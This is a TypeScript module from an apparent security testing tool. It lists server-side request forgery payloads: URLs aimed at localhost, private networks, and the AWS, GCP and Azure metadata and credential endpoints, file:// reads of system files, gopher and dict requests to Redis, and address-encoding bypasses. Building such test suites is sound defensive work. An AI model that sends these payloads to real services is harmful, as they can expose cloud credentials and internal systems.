/**
 * SSRF (Server-Side Request Forgery) Payloads
 * Payloads for testing SSRF vulnerabilities
 */

export interface SSRFPayload {
  url: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  target: 'localhost' | 'internal' | 'cloud' | 'external';
}

export const SSRF_PAYLOADS: SSRFPayload[] = [
  // Localhost SSRF
  {
    url: "http://127.0.0.1/",
    description: "SSRF to localhost (127.0.0.1)",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://localhost/",
    description: "SSRF to localhost",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://0.0.0.0/",
    description: "SSRF to 0.0.0.0",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://[::1]/",
    description: "SSRF to IPv6 localhost",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://127.0.0.1:8080/admin",
    description: "SSRF to localhost on specific port",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://127.1/",
    description: "SSRF to localhost (shortened IP)",
    severity: 'high',
    target: 'localhost',
  },
  
  // Internal network SSRF
  {
    url: "http://192.168.1.1/",
    description: "SSRF to internal network",
    severity: 'critical',
    target: 'internal',
  },
  {
    url: "http://10.0.0.1/",
    description: "SSRF to private network (10.x.x.x)",
    severity: 'critical',
    target: 'internal',
  },
  {
    url: "http://172.16.0.1/",
    description: "SSRF to private network (172.16.x.x)",
    severity: 'critical',
    target: 'internal',
  },
  {
    url: "http://internal-server.local/",
    description: "SSRF to internal hostname",
    severity: 'critical',
    target: 'internal',
  },
  {
    url: "http://intranet/",
    description: "SSRF to intranet",
    severity: 'critical',
    target: 'internal',
  },
  
  // Cloud metadata SSRF
  {
    url: "http://169.254.169.254/latest/meta-data/",
    description: "SSRF to AWS metadata service",
    severity: 'critical',
    target: 'cloud',
  },
  {
    url: "http://169.254.169.254/latest/user-data/",
    description: "SSRF to AWS user-data",
    severity: 'critical',
    target: 'cloud',
  },
  {
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    description: "SSRF to AWS IAM credentials",
    severity: 'critical',
    target: 'cloud',
  },
  {
    url: "http://metadata.google.internal/computeMetadata/v1/",
    description: "SSRF to GCP metadata service",
    severity: 'critical',
    target: 'cloud',
  },
  {
    url: "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
    description: "SSRF to Azure metadata service",
    severity: 'critical',
    target: 'cloud',
  },
  {
    url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
    description: "SSRF to Azure identity service",
    severity: 'critical',
    target: 'cloud',
  },
  
  // Protocol handlers
  {
    url: "file:///etc/passwd",
    description: "SSRF using file:// protocol",
    severity: 'critical',
    target: 'localhost',
  },
  {
    url: "file:///C:/Windows/System32/drivers/etc/hosts",
    description: "SSRF using file:// protocol (Windows)",
    severity: 'critical',
    target: 'localhost',
  },
  {
    url: "gopher://127.0.0.1:6379/_INFO",
    description: "SSRF using gopher:// protocol (Redis)",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "dict://127.0.0.1:6379/INFO",
    description: "SSRF using dict:// protocol (Redis)",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "ldap://127.0.0.1/",
    description: "SSRF using ldap:// protocol",
    severity: 'high',
    target: 'localhost',
  },
  
  // URL encoding bypasses
  {
    url: "http://127.0.0.1%00.attacker.com/",
    description: "SSRF with null byte",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://127.0.0.1@attacker.com/",
    description: "SSRF with @ symbol",
    severity: 'high',
    target: 'external',
  },
  {
    url: "http://127.0.0.1#.attacker.com/",
    description: "SSRF with # symbol",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://127.0.0.1%23.attacker.com/",
    description: "SSRF with URL-encoded #",
    severity: 'high',
    target: 'localhost',
  },
  
  // IPv6 SSRF
  {
    url: "http://[::ffff:127.0.0.1]/",
    description: "SSRF using IPv6-mapped IPv4",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://[::ffff:169.254.169.254]/",
    description: "SSRF to AWS metadata via IPv6",
    severity: 'critical',
    target: 'cloud',
  },
  
  // DNS rebinding
  {
    url: "http://127.0.0.1.nip.io/",
    description: "SSRF using DNS rebinding (nip.io)",
    severity: 'high',
    target: 'localhost',
  },
  {
    url: "http://127.0.0.1.xip.io/",
    description: "SSRF using DNS rebinding (xip.io)",
    severity: 'high',
    target: 'localhost',
  },
  
  // External SSRF (for testing)
  {
    url: "http://attacker.com/",
    description: "SSRF to external server",
    severity: 'medium',
    target: 'external',
  },
  {
    url: "http://httpbin.org/get",
    description: "SSRF to httpbin for testing",
    severity: 'low',
    target: 'external',
  },
];

/**
 * Get SSRF payloads filtered by target type
 */
export function getSSRFPayloads(target?: string): SSRFPayload[] {
  if (!target) {
    return SSRF_PAYLOADS;
  }
  return SSRF_PAYLOADS.filter(p => p.target === target);
}

/**
 * Get SSRF payloads by severity
 */
export function getSSRFPayloadsBySeverity(severity: 'critical' | 'high' | 'medium' | 'low'): SSRFPayload[] {
  return SSRF_PAYLOADS.filter(p => p.severity === severity);
}

